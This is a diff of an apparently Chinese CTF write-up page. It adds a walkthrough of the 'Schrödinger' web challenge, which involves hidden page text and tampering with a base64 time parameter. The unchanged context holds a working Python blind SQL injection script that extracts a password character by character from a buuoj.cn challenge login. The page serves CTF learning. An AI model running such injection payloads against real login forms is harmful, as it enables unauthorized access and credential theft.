@@ -232,6 +232,18 @@
 <p>显而易见这就是一个盲注了，构造payload脚本：（因为查找过于慢，照着之前写的finalsql注入的脚本改的）</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b49b6771-4b40-4bd5-8959-4bea5ae5fd40.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;: &quot;admin\\&quot;, &quot;password&quot;: &quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while (True):</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        # payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line"></span><br><span class="line">        data[&#x27;password&#x27;] = payload</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;stronger&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
+<h2 id="Schrodinger"><a href="#Schrodinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>题目有一段很长的话，翻译一下大概就是，这个网站可以爆破出各种网站的密码之类的，留下了一个文本框，可能是要我们爆破什么网栈的密码，有一个input输入，以及一个check，如果再未完成之前check可能会失败。</p>
+<p>题目就是这个意思，现在应该要做的就是网站需要我们爆破的是什么密码：</p>
+<p>在复制文本翻译的时候，意外发现了隐藏的一句话，被标白色了：</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/9.png" alt="1"></p>
+<p>打开看一下</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/10.png" alt="1"></p>
+<p>也就是我们需要爆破这个网站了，输入网站开始等待。</p>
+<p>等待了很久发现很慢很慢好像没有什么用，之前点了check发现又得重来，所以抓个包看看</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/11.png" alt="1"></p>
+<p>发现比input之前多了一段代码，%3D是<code>==</code>很明显是base64编码，拿去解密一下看到是一个时间的编码，那我们这里出现的时间说明，这个解密应该是虚假的，但是时间应该是多少呢，既然他根据时间来，我们把时间删了他是不是可以直接出来flag？删除</p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/12.png" alt="1"></p>
+<p>可以看到有一个av号，打开看下哦吼：量子力学，一个正经课程，flag应该不会藏在视频里面，去评论区看看找到了flag(不得不说真阴间啊)</p>
 
         </div>
 
@@ -400,7 +412,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="nav-number">1.</span> <span class="nav-text">假猪套天下第一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">简单注入</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="nav-number">1.</span> <span class="nav-text">假猪套天下第一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">简单注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Schrodinger"><span class="nav-number">3.</span> <span class="nav-text">Schrödinger</span></a></li></ol>
     </div>
 </div>
         </aside>
